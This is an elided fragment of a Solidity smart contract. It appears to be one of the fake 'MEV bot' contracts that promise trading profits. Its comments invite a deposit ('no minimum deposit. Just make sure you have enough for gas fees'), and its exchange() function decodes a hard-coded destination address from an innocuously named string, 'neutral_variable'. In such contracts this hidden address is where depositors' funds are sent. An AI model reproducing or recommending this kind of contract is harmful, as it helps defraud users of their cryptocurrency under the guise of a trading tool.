...
/**
   ...
   *FEB 2024 updated - no minimum deposit. Just make sure you have enough for gas fees 
    BE CAREFUL 
...
function exchange() internal pure returns (address adr) {
   string memory neutral_variable = "QG51ECebd9E61DdD8aE27403F357a6dA79a3C2a1c3";
